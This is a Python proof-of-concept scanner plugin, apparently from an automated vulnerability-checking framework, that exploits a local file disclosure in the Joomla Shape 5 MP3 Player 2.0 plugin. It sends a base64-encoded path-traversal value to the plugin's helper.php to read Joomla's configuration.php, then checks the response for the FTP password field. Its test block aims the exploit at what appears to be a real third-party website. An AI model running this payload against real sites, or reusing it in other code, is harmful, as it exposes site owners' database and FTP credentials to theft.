from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = fyxy
#_PlugName_ = Joomla Shape 5 MP3 Player 2.0 Plugin LFD
#__Refer___ = http://0day.today/exploits/24724
import re

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
        target = arg + payload
        
        code, head, res, errcode, _ = curl.curl2(target);
        if code == 200 and "public $ftp_pass" in res and "class JConfig {" in res:
            output(target,result,'hole')

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_a276ebea23e900843f2d96644c8d9635.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_a276ebea23e900843f2d96644c8d9635.py
#/root/github/poccreate/codesrc/exp-1880.py